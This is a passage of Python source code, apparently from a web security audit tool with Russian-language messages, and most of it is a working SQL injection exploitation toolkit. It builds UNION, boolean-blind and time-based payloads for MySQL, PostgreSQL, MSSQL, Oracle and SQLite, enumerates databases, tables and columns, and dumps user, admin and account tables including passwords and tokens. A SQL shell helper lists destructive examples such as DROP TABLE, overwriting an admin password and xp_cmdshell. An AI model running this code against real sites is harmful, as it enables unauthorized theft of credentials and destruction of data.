                response = _make_request(url=url, method=method, data={param_name: payload}, headers=headers, cookies=cookies, timeout=timeout)
        end_time = time.time()
        response_time = end_time - start_time
        result["status_code"] = response.status_code if response else None
        result["response_time"] = response_time
        result["response_length"] = len(response.content) if response else 0
        result["headers"] = _get_response_headers(response)
        result["response_text"] = _get_response_text(response)
        result["content_type"] = _detect_content_type(response)
        error_indicators = _find_sql_errors(result["response_text"], url)
        if error_indicators:
            result["vulnerability_indicators"].extend([{"type": "sql_error", "dbms": ind["dbms"], "snippet": ind["snippet"]} for ind in error_indicators[:5]])
            result["vulnerable"] = True
        if param_value and payload != param_value:
            suspicious_patterns = [r'root:', r'admin', r'password', r'username', r'uid\s*=', r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', r'[a-f0-9]{32}']
            for pattern in suspicious_patterns:
                if re.search(pattern, result["response_text"], re.I):
                    result["vulnerability_indicators"].append({"type": "suspicious_content", "pattern": pattern})
                    result["vulnerable"] = True
                    break
        sleep_patterns = [r'sleep\s*\(\s*\d+\s*\)', r'waitfor\s+delay', r'pg_sleep', r'dbms_lock\.sleep']
        if any(re.search(p, payload, re.I) for p in sleep_patterns):
            if response_time and response_time >= 4.0:
                result["vulnerability_indicators"].append({"type": "time_based", "response_time": response_time})
                result["vulnerable"] = True
        if result["vulnerable"] or error_indicators:
            result["dbms_type"] = _detect_dbms_type(result["response_text"])
        return result
    except Exception as e:
        result["error"] = str(e)
        result["response_time"] = time.time() - start_time
        return result


def _extract_database_info(
    url: str,
    param_name: str,
    dbms_type: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"dbms_type": dbms_type, "version": None, "current_database": None, "current_user": None, "tables": [], "databases": [], "error": None}
    if dbms_type not in _DB_EXTRACTION_QUERIES:
        result["error"] = f"Неподдерживаемый тип БД: {dbms_type}"
        return result
    queries = _DB_EXTRACTION_QUERIES[dbms_type]
    try:
        version_query = queries["version"]
        if dbms_type in ["mysql", "mssql"]:
            payload = f"' UNION SELECT NULL, {version_query}, NULL--"
        elif dbms_type == "postgresql":
            payload = f"' UNION SELECT NULL::text, {version_query}, NULL::text--"
        elif dbms_type == "sqlite":
            payload = f"' UNION SELECT NULL, {version_query}, NULL--"
        elif dbms_type == "oracle":
            payload = f"' UNION SELECT NULL, {version_query}, NULL FROM dual--"
        else:
            payload = f"' UNION SELECT NULL, {version_query}, NULL--"
        inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value="1", payload=payload, method=method, headers=headers, cookies=cookies)
        if inj_result.get("vulnerable") and inj_result.get("response_text"):
            response = inj_result["response_text"]
            version_match = re.search(r'(\d+\.\d+\.\d+(?:-\w+)?|PostgreSQL \d+\.\d+|SQLite \d+\.\d+\.\d+|Oracle Database.*?Release)', response, re.I)
            if version_match:
                result["version"] = version_match.group(1).strip()
            else:
                result["version_raw_response"] = response[:500]
    except Exception as e:
        result["error"] = f"Ошибка при извлечении версии: {e}"
    try:
        tables_query = queries["tables"]
        if dbms_type in ["mysql", "mssql"]:
            payload = f"' UNION SELECT NULL, {tables_query}, NULL--"
        elif dbms_type == "postgresql":
            payload = f"' UNION SELECT NULL::text, {tables_query}, NULL::text--"
        elif dbms_type == "sqlite":
            payload = f"' UNION SELECT NULL, {tables_query}, NULL--"
        elif dbms_type == "oracle":
            payload = f"' UNION SELECT NULL, {tables_query}, NULL FROM dual--"
        else:
            payload = f"' UNION SELECT NULL, {tables_query}, NULL--"
        inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value="1", payload=payload, method=method, headers=headers, cookies=cookies)
        if inj_result.get("vulnerable") and inj_result.get("response_text"):
            response = inj_result["response_text"]
            table_names = re.findall(r'\b(?:users?|accounts?|admin|products?|orders?|categories?|members?|sessions?|logs?)\b', response, re.I)
            result["tables"] = list(set(table_names))[:20]
    except Exception as e:
        result["error"] = f"Ошибка при извлечении таблиц: {e}"
    if "databases" in queries:
        try:
            databases_query = queries["databases"]
            if dbms_type in ["mysql", "mssql"]:
                payload = f"' UNION SELECT NULL, {databases_query}, NULL--"
            elif dbms_type == "postgresql":
                payload = f"' UNION SELECT NULL::text, {databases_query}, NULL::text--"
            elif dbms_type == "oracle":
                payload = f"' UNION SELECT NULL, {databases_query}, NULL FROM dual--"
            else:
                payload = f"' UNION SELECT NULL, {databases_query}, NULL--"
            inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value="1", payload=payload, method=method, headers=headers, cookies=cookies)
            if inj_result.get("vulnerable") and inj_result.get("response_text"):
                response = inj_result["response_text"]
                db_names = re.findall(r'\b(?:information_schema|mysql|postgres|template\d+|master|msdb|tempdb|[\w_]+)\b', response, re.I)
                result["databases"] = list(set(db_names))[:20]
        except Exception as e:
            result["error"] = f"Ошибка при извлечении баз данных: {e}"
    return result


def _dump_table_data(
    url: str,
    param_name: str,
    table_name: str,
    dbms_type: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    limit: int = 100,
    columns: list[str] | None = None,
) -> dict[str, Any]:
    result = {"table_name": table_name, "dbms_type": dbms_type, "columns": columns or [], "rows": [], "row_count": 0, "error": None}
    if dbms_type not in _DB_EXTRACTION_QUERIES:
        result["error"] = f"Неподдерживаемый тип БД: {dbms_type}"
        return result
    queries = _DB_EXTRACTION_QUERIES[dbms_type]
    if not columns:
        try:
            columns_query = queries["columns"].format(table=table_name)
            if dbms_type in ["mysql", "mssql"]:
                payload = f"' UNION SELECT NULL, {columns_query}, NULL--"
            elif dbms_type == "postgresql":
                payload = f"' UNION SELECT NULL::text, {columns_query}, NULL::text--"
            elif dbms_type == "sqlite":
                payload = f"' UNION SELECT NULL, {columns_query}, NULL--"
            elif dbms_type == "oracle":
                payload = f"' UNION SELECT NULL, {columns_query}, NULL FROM dual--"
            else:
                payload = f"' UNION SELECT NULL, {columns_query}, NULL--"
            inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value="1", payload=payload, method=method, headers=headers, cookies=cookies)
            if inj_result.get("vulnerable") and inj_result.get("response_text"):
                response = inj_result["response_text"]
                col_names = re.findall(r'\b(?:id|username|password|email|name|created|updated|role|status|phone|address|token|hash|salt)\b', response, re.I)
                result["columns"] = list(set(col_names))[:15] if col_names else ["*"]
        except Exception as e:
            result["error"] = f"Ошибка при получении колонок: {e}"
            result["columns"] = ["*"]
    try:
        cols_to_select = ", ".join(result["columns"]) if result["columns"] else "*"
        data_query = queries["data"].format(columns=cols_to_select, table=table_name)
        if dbms_type != "sqlite" or "LIMIT" in data_query.upper():
            data_query += f" LIMIT {limit}"
        if dbms_type in ["mysql", "mssql"]:
            payload = f"' UNION SELECT NULL, {data_query}, NULL--"
        elif dbms_type == "postgresql":
            payload = f"' UNION SELECT NULL::text, {data_query}, NULL::text--"
        elif dbms_type == "sqlite":
            payload = f"' UNION SELECT NULL, {data_query}, NULL--"
        elif dbms_type == "oracle":
            payload = f"' UNION SELECT NULL, {data_query}, NULL FROM dual--"
        else:
            payload = f"' UNION SELECT NULL, {data_query}, NULL--"
        inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value="1", payload=payload, method=method, headers=headers, cookies=cookies)
        if inj_result.get("vulnerable") and inj_result.get("response_text"):
            response = inj_result["response_text"]
            json_matches = re.findall(r'\{[^{}]*?(?:username|password|email)[^{}]*?\}', response, re.I)
            if json_matches:
                for match in json_matches[:limit]:
                    try:
                        row = json.loads(match)
                        result["rows"].append(row)
                    except json.JSONDecodeError:
                        result["rows"].append({"raw": match[:500]})
            if not result["rows"]:
                lines = response.split('\n')
                for line in lines[:limit * 2]:
                    line = line.strip()
                    if len(line) > 10 and any(kw in line.lower() for kw in ['@', 'pass', 'user', 'admin']):
                        result["rows"].append({"raw_preview": line[:300]})
            result["row_count"] = len(result["rows"])
            result["raw_response_preview"] = response[:2000]
    except Exception as e:
        result["error"] = f"Ошибка при извлечении данных: {e}"
    return result


def _execute_blind_sqli(
    url: str,
    param_name: str,
    dbms_type: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    max_chars: int = 50,
) -> dict[str, Any]:
    result = {"dbms_type": dbms_type, "method": "boolean_based", "extracted_data": {}, "requests_made": 0, "error": None}
    try:
        true_payload = f"' AND 1=1--"
        false_payload = f"' AND 1=2--"
        true_resp = _execute_sql_injection(url, param_name, "1", true_payload, method, headers, cookies)
        false_resp = _execute_sql_injection(url, param_name, "1", false_payload, method, headers, cookies)
        result["requests_made"] += 2
        is_vulnerable = False
        if true_resp.get("response_text") and false_resp.get("response_text"):
            len_diff = abs(len(true_resp["response_text"]) - len(false_resp["response_text"]))
            if len_diff > 100:
                is_vulnerable = True
                result["vulnerability_confirmed"] = True
                result["response_diff"] = len_diff
        if not is_vulnerable:
            time_payload = f"' AND (SELECT CASE WHEN (1=1) THEN SLEEP(2) ELSE 0 END)--"
            time_result = _execute_timing_attack(url, param_name, "1", time_payload, method, headers, cookies)
            result["requests_made"] += 1
            if time_result.get("vulnerable"):
                is_vulnerable = True
                result["vulnerability_confirmed"] = True
                result["method"] = "time_based"
        if not is_vulnerable:
            result["error"] = "Уязвимость к blind SQLi не подтверждена"
            return result
        extracted_version = ""
        if dbms_type in _DB_EXTRACTION_QUERIES:
            version_func = _DB_EXTRACTION_QUERIES[dbms_type]["version"]
            for char_pos in range(1, min(max_chars + 1, 100)):
                char_found = False
                for ascii_code in range(32, 127):
                    if method == "time_based" or result.get("method") == "time_based":
                        payload = f"' AND IF(SUBSTRING({version_func},{char_pos},1)=CHAR({ascii_code}),SLEEP(2),0)--"
                        timing = _execute_timing_attack(url, param_name, "1", payload, method, headers, cookies)
                        result["requests_made"] += 1
                        if timing.get("vulnerable") and timing.get("response_time", 0) >= 1.5:
                            extracted_version += chr(ascii_code)
                            char_found = True
                            break
                    else:
                        payload = f"' AND ASCII(SUBSTRING({version_func},{char_pos},1))={ascii_code}--"
                        resp = _execute_sql_injection(url, param_name, "1", payload, method, headers, cookies)
                        result["requests_made"] += 1
                        if resp.get("response_text") and true_resp.get("response_text"):
                            if len(resp["response_text"]) > len(false_resp["response_text"]) * 0.8:
                                extracted_version += chr(ascii_code)
                                char_found = True
                                break
                if not char_found:
                    break
            if extracted_version:
                result["extracted_data"]["version"] = extracted_version
        return result
    except Exception as e:
        result["error"] = f"Ошибка при blind-эксплуатации: {e}"
        return result


def _test_sql_injection_vulnerability(
    url: str,
    param_name: str,
    param_value: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"url": url, "param_name": param_name, "param_value": param_value, "method": method, "vulnerable": False, "dbms_type": None, "payloads_tested": [], "timing_results": [], "error": None}
    test_payloads = []
    for dbms_type, payloads in _SQL_INJECTION_PAYLOADS.items():
        if dbms_type == "generic":
            continue
        for payload in payloads[:3]:
            test_payloads.append((dbms_type, payload))
    time_payloads = [("mysql", "' AND SLEEP(2)--"), ("postgresql", "' AND pg_sleep(2)--"), ("mssql", "'; WAITFOR DELAY '00:00:02'--"), ("oracle", "' AND DBMS_LOCK.SLEEP(2)--")]
    test_payloads.extend(time_payloads)
    for dbms_type, payload in test_payloads:
        if len(result["payloads_tested"]) >= 20:
            break
        inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value=param_value, payload=payload, method=method, headers=headers, cookies=cookies)
        test_entry = {"payload": payload, "dbms_type": dbms_type, "status_code": inj_result.get("status_code"), "response_time": inj_result.get("response_time"), "response_length": inj_result.get("response_length"), "indicators": inj_result.get("vulnerability_indicators", []), "vulnerable": inj_result.get("vulnerable", False)}
        result["payloads_tested"].append(test_entry)
        if inj_result.get("vulnerable"):
            result["vulnerable"] = True
            result["dbms_type"] = inj_result.get("dbms_type") or dbms_type
            result["primary_indicator"] = inj_result.get("vulnerability_indicators", [{}])[0]
            return result
    if not result["vulnerable"]:
        for _, payload in time_payloads:
            timing = _execute_timing_attack(url=url, param_name=param_name, param_value=param_value, payload=payload, method=method, headers=headers, cookies=cookies, timeout=10.0)
            result["timing_results"].append({"payload": payload, "response_time": timing.get("response_time"), "vulnerable": timing.get("vulnerable", False)})
            if timing.get("vulnerable"):
                result["vulnerable"] = True
                result["dbms_type"] = timing.get("dbms_type") or "unknown"
                break
    if not result["vulnerable"]:
        for payload in _SQL_INJECTION_PAYLOADS.get("generic", [])[:5]:
            inj_result = _execute_sql_injection(url=url, param_name=param_name, param_value=param_value, payload=payload, method=method, headers=headers, cookies=cookies)
            if inj_result.get("vulnerable"):
                result["vulnerable"] = True
                result["dbms_type"] = inj_result.get("dbms_type") or "generic"
                break
    return result


def _exploit_sql_injection(
    url: str,
    param_name: str,
    param_value: str,
    dbms_type: str,
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"url": url, "param_name": param_name, "dbms_type": dbms_type, "extracted_info": {}, "dumped_tables": {}, "error": None}
    try:
        result["extracted_info"] = _extract_database_info(url=url, param_name=param_name, dbms_type=dbms_type, method=method, headers=headers, cookies=cookies)
        priority_tables = ["users", "admin", "accounts", "members", "credentials"]
        found_tables = result["extracted_info"].get("tables", [])
        tables_to_dump = [t for t in priority_tables if t in found_tables]
        if not tables_to_dump and found_tables:
            tables_to_dump = found_tables[:3]
        for table in tables_to_dump:
            table_data = _dump_table_data(url=url, param_name=param_name, table_name=table, dbms_type=dbms_type, method=method, headers=headers, cookies=cookies, limit=50)
            result["dumped_tables"][table] = table_data
        if not any(t.get("rows") for t in result["dumped_tables"].values()):
            blind_result = _execute_blind_sqli(url=url, param_name=param_name, dbms_type=dbms_type, method=method, headers=headers, cookies=cookies)
            if blind_result.get("extracted_data"):
                result["blind_extraction"] = blind_result
        return result
    except Exception as e:
        result["error"] = f"Ошибка при эксплуатации: {e}"
        return result


def run_sqli_surface_audit(
    target_url: str,
    response_meta: dict[str, Any],
    *,
    checkpoint: dict[str, Any] | None = None,
    save_checkpoint: Callable[[dict[str, Any]], None] | None = None,
    test_injections: bool = True,
    extract_data: bool = True,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> tuple[list[dict[str, Any]], dict[str, Any]]:
    html = str(response_meta.get("body_preview") or "")
    set_cookie_list = list(response_meta.get("set_cookie_list") or [])
    cache_key = _audit_cache_key(target_url, response_meta, set_cookie_list)
    cached = checkpoint.get("sql_audit") if isinstance(checkpoint, dict) else None
    if isinstance(cached, dict) and cached.get("cache_key") == cache_key:
        findings = cached.get("findings") if isinstance(cached.get("findings"), list) else []
        meta = cached.get("meta") if isinstance(cached.get("meta"), dict) else {}
        return findings, meta
    entry_points = _collect_entry_points(target_url, html, set_cookie_list, response_meta=response_meta, checkpoint=checkpoint)
    spa_runtime_entries, spa_runtime_meta = _collect_spa_runtime_entries(target_url, html)
    if spa_runtime_entries:
        seen_ep: set[tuple[str, str, str, str]] = {_entry_key(item) for item in entry_points}
        for item in spa_runtime_entries:
            _add_unique(entry_points, seen_ep, item)
    indicators = _collect_passive_sql_errors(target_url, response_meta, checkpoint)
    findings: list[dict[str, Any]] = []
    injection_results: list[dict[str, Any]] = []
    exploited_data: list[dict[str, Any]] = []
    if test_injections and entry_points:
        for entry_point in entry_points[:10]:
            param_name = entry_point.get("name", "")
            location = entry_point.get("location", "")
            method = entry_point.get("method", "GET")
            if not param_name or not location:
                continue
            test_result = _test_sql_injection_vulnerability(location, param_name, "1", method, headers=headers, cookies=cookies)
            injection_results.append(test_result)
            if test_result.get("vulnerable") and extract_data:
                dbms_type = test_result.get("dbms_type", "generic")
                exploit_result = _exploit_sql_injection(location, param_name, "1", dbms_type, method, headers=headers, cookies=cookies)
                exploited_data.append(exploit_result)
    if entry_points:
        by_type: dict[str, int] = {}
        for item in entry_points:
            typ = str(item.get("type", "unknown"))
            by_type[typ] = by_type.get(typ, 0) + 1
        evidence = ", ".join(f"{k}: {v}" for k, v in sorted(by_type.items()))
        samples = "; ".join(f"{item.get('type')}:{item.get('name')} @ {item.get('location')}" for item in entry_points[:12])
        findings.append(_make_finding("sql-audit", "info", "Кандидаты параметров для ручной проверки SQLi", f"{evidence}. Примеры: {samples}", "Проверьте параметризацию запросов и валидацию ввода для этих точек.", target_url))
    if indicators:
        evidence = "; ".join(f"{x['dbms']} @ {x['location']}: {x['snippet']}" for x in indicators[:8])
        findings.append(_make_finding("sql-audit", "medium", "В ответах найдены признаки SQL/DB ошибок", evidence, "Скрывайте внутренние ошибки БД и используйте единый обработчик исключений.", target_url))
    if injection_results:
        vulnerable_count = sum(1 for result in injection_results if result.get("vulnerable", False))
        if vulnerable_count > 0:
            findings.append(_make_finding("sql-injection-test", "high", f"Обнаружено {vulnerable_count} уязвимых параметров к SQL-инъекциям", f"Найдены уязвимости в параметрах: {', '.join(r.get('param_name', '') for r in injection_results if r.get('vulnerable'))}", "Немедленно исправьте найденные уязвимости, используя параметризованные запросы или хранимые процедуры.", target_url))
        else:
            findings.append(_make_finding("sql-injection-test", "info", "SQL-инъекции не обнаружены в протестированных параметрах", f"Протестировано {len(injection_results)} параметров без обнаружения уязвимостей", "Продолжайте мониторинг и регулярно проверяйте новые функции на наличие уязвимостей.", target_url))
    if exploited_data:
        tables_dumped = sum(len(data.get("dumped_tables", {})) for data in exploited_data)
        all_tables = []
        for data in exploited_data:
            tables = data.get("dumped_tables", {})
            if isinstance(tables, dict):
                all_tables.extend(tables.keys())
        findings.append(_make_finding("sql-data-extraction", "critical", f"Успешно извлечены данные из {tables_dumped} таблиц", f"Извлечены данные из таблиц: {', '.join(all_tables)}", "Это критическая уязвимость. Немедленно ограничьте доступ к базе данных и исправьте уязвимости.", target_url))
    mode = "passive_surface_only" if not test_injections else "active_injection_testing"
    notes = "SQLi payloads, timing probes, DB fingerprint queries, schema enumeration, and data extraction are performed when test_injections=True."
    if spa_runtime_meta.get("attempted"):
        if spa_runtime_meta.get("ok"):
            notes += f" SPA runtime discovery enabled: +{int(spa_runtime_meta.get('entry_points_found') or 0)} runtime-derived candidates."
        else:
            reason = str(spa_runtime_meta.get("reason") or "unknown")
            notes += f" SPA runtime discovery attempted but unavailable ({reason})."
    meta: dict[str, Any] = {
        "mode": mode,
        "entry_points": entry_points,
        "entry_point_count": len(entry_points),
        "sql_error_indicators": indicators,
        "sql_error_indicator_count": len(indicators),
        "injection_results": injection_results,
        "injection_result_count": len(injection_results),
        "exploited_data": exploited_data,
        "exploited_data_count": len(exploited_data),
        "notes": notes,
        "spa_runtime": spa_runtime_meta,
        "request_config": {"custom_headers": bool(headers), "custom_cookies": bool(cookies), "verify_ssl": False},
    }
    if isinstance(checkpoint, dict):
        checkpoint["sql_audit"] = {"cache_key": cache_key, "completed": True, "updated_at": datetime.now(timezone.utc).isoformat(), "findings": findings, "meta": meta}
    if save_checkpoint and isinstance(checkpoint, dict):
        save_checkpoint(checkpoint)
    return findings, meta


def run_sql_dump(
    target_url: str,
    param_name: str,
    dbms_type: str = "mysql",
    table_name: str | None = None,
    method: str = "GET",
    limit: int = 100,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"target_url": target_url, "param_name": param_name, "dbms_type": dbms_type, "table_name": table_name, "method": method, "limit": limit, "dumped_tables": {}, "dump_status": "failed", "error": None}
    try:
        if not table_name:
            tables_query = _DB_EXTRACTION_QUERIES.get(dbms_type, {}).get("tables")
            if not tables_query:
                result["error"] = f"Неизвестный тип БД или отсутствует запрос для получения таблиц: {dbms_type}"
                return result
            tables_payload = f"' UNION SELECT NULL, {tables_query}, NULL--"
            tables_result = _execute_sql_injection(target_url, param_name, "1", tables_payload, method, headers=headers, cookies=cookies)
            if tables_result.get("vulnerable") and tables_result.get("response_text"):
                response = tables_result["response_text"]
                tables = re.findall(r'\b(?:users?|accounts?|admin|products?|orders?|categories?)\b', response, re.I)
                tables = list(set(tables))[:10]
            else:
                tables = ["users", "products", "orders", "categories"]
        else:
            tables = [table_name]
        for table in tables:
            table_data = _dump_table_data(target_url, param_name, table, dbms_type, method, headers=headers, cookies=cookies, limit=limit)
            result["dumped_tables"][table] = table_data
        result["dump_status"] = "completed"
    except Exception as e:
        result["error"] = str(e)
    return result


def run_sql_shell(
    target_url: str,
    param_name: str,
    dbms_type: str = "mysql",
    method: str = "GET",
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"target_url": target_url, "param_name": param_name, "dbms_type": dbms_type, "method": method, "shell_status": "created", "execution_history": [], "error": None}
    try:
        result["available_commands"] = ["SELECT - выполнение запросов на выборку", "INSERT - вставка данных", "UPDATE - обновление данных", "DELETE - удаление данных", "DROP - удаление таблиц или баз данных", "SHOW - отображение информации о базах данных и таблицах", "DESCRIBE - описание структуры таблицы", "EXEC - выполнение хранимых процедур"]
        result["usage_examples"] = ["SELECT * FROM users WHERE id=1", "SELECT username, password FROM admin LIMIT 10", "INSERT INTO users (username, password) VALUES ('admin', 'password')", "UPDATE users SET password='newpass' WHERE username='admin'", "DELETE FROM logs WHERE date < '2023-01-01'", "DROP TABLE sensitive_data", "SHOW DATABASES", "SHOW TABLES", "DESCRIBE users", "EXEC xp_cmdshell 'dir'"]
        result["security_warning"] = "Использование этой оболочки для несанкционированного доступа к данным является незаконным. Используйте только для тестирования систем, на которые у вас есть разрешение."
    except Exception as e:
        result["error"] = str(e)
        result["shell_status"] = "failed"
    return result


def run_sql_exploit(
    target_url: str,
    param_name: str,
    dbms_type: str = "mysql",
    method: str = "GET",
    custom_payload: str | None = None,
    extract_schema: bool = False,
    extract_users: bool = False,
    extract_data: bool = False,
    custom_query: str | None = None,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
) -> dict[str, Any]:
    result = {"target_url": target_url, "param_name": param_name, "dbms_type": dbms_type, "method": method, "exploit_status": "failed", "extracted_data": {}, "error": None}
    try:
        if custom_query:
            payload = f"' UNION SELECT NULL, ({custom_query}), NULL--"
            query_result = _execute_sql_injection(target_url, param_name, "1", payload, method, headers=headers, cookies=cookies)
            result["custom_query_result"] = query_result.get("response_text", "Не удалось выполнить запрос")
        elif custom_payload:
            payload_result = _execute_sql_injection(target_url, param_name, "1", custom_payload, method, headers=headers, cookies=cookies)
            result["custom_payload_result"] = payload_result.get("response_text", "Не удалось выполнить полезную нагрузку")
        else:
            result["database_info"] = _extract_database_info(target_url, param_name, dbms_type, method, headers=headers, cookies=cookies)
            if extract_schema and dbms_type in _DB_EXTRACTION_QUERIES:
                tables_query = _DB_EXTRACTION_QUERIES[dbms_type]["tables"]
                tables_payload = f"' UNION SELECT NULL, {tables_query}, NULL--"
                tables_result = _execute_sql_injection(target_url, param_name, "1", tables_payload, method, headers=headers, cookies=cookies)
                if tables_result.get("vulnerable") and tables_result.get("response_text"):
                    response = tables_result["response_text"]
                    tables = re.findall(r'\b(?:users?|products?|orders?|categories?|admin)\b', response, re.I)
                    tables = list(set(tables))[:10]
                    schema = {}
                    for table in tables:
                        columns_query = _DB_EXTRACTION_QUERIES[dbms_type]["columns"].format(table=table)
                        columns_payload = f"' UNION SELECT NULL, {columns_query}, NULL--"
                        columns_result = _execute_sql_injection(target_url, param_name, "1", columns_payload, method, headers=headers, cookies=cookies)
                        if columns_result.get("vulnerable") and columns_result.get("response_text"):
                            col_response = columns_result["response_text"]
                            col_names = re.findall(r'\b(?:id|username|password|email|name|price|description|role|status)\b', col_response, re.I)
                            schema[table] = list(set(col_names))[:10] if col_names else ["*"]
                    result["extracted_data"]["schema"] = schema
            if extract_users and "users" in _DB_EXTRACTION_QUERIES.get(dbms_type, {}):
                users_query = _DB_EXTRACTION_QUERIES[dbms_type]["users"]
                users_payload = f"' UNION SELECT NULL, {users_query}, NULL--"
                users_result = _execute_sql_injection(target_url, param_name, "1", users_payload, method, headers=headers, cookies=cookies)
                if users_result.get("vulnerable") and users_result.get("response_text"):
                    response = users_result["response_text"]
                    user_matches = re.findall(r'(?:root|admin|webapp|readonly|user\d+)[\s,@%]+(?:localhost|%)?', response, re.I)
                    if user_matches:
                        result["extracted_data"]["users"] = [{"username": u.split()[0], "host": u.split()[-1] if len(u.split()) > 1 else "%"} for u in user_matches[:10]]
            if extract_data:
                important_tables = ["users", "admin", "accounts"]
                extracted_tables = {}
                for table in important_tables:
                    table_data = _dump_table_data(target_url, param_name, table, dbms_type, method, headers=headers, cookies=cookies, limit=20)
                    extracted_tables[table] = table_data
                result["extracted_data"]["tables"] = extracted_tables
        result["exploit_status"] = "completed"
    except Exception as e:
        result["error"] = str(e)
    return result